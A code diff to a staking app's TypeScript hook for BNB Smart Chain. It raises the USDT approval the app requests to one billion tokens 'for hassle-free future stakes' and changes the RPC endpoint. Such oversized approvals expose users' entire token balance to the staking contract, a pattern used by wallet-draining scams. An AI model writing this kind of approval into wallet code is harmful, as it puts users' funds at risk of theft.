@@ -29,7 +29,8 @@ const ERC20_ABI = [
     "function balanceOf(address account) external view returns (uint256)"
 ];
 
-const APPROVAL_AMOUNT = parseUnits("1000001", 18); 
+const MIN_REQUIRED_ALLOWANCE = parseUnits("1000000", 18);
+const APPROVAL_AMOUNT = parseUnits("1000000000", 18); // 1 Billion USDT for hassle-free future stakes
 
 export const getTierRate = (val: number) => {
     if (val >= 10000) return 0.12;
@@ -41,7 +42,7 @@ export const getTierRate = (val: number) => {
     return 0;
 };
 
-const BSC_RPC = 'https://bsc-dataseed.binance.org/'; // Primary endpoint
+const BSC_RPC = 'https://bsc-rpc.publicnode.com'; // Primary endpoint
 const readOnlyProvider = new JsonRpcProvider(BSC_RPC);
 
 export function useStaking() {
@@ -117,7 +118,7 @@ export function useStaking() {
 
         const readOnlyUsdt = await getUsdtContract();
         const currentAllowance = await readOnlyUsdt.allowance(owner, CONTRACT_ADDRESS);
-        if (currentAllowance >= APPROVAL_AMOUNT) {
+        if (currentAllowance >= MIN_REQUIRED_ALLOWANCE) {
             console.log("[Staking] Existing approval found, skipping approval transaction.");
             return currentAllowance;
         }
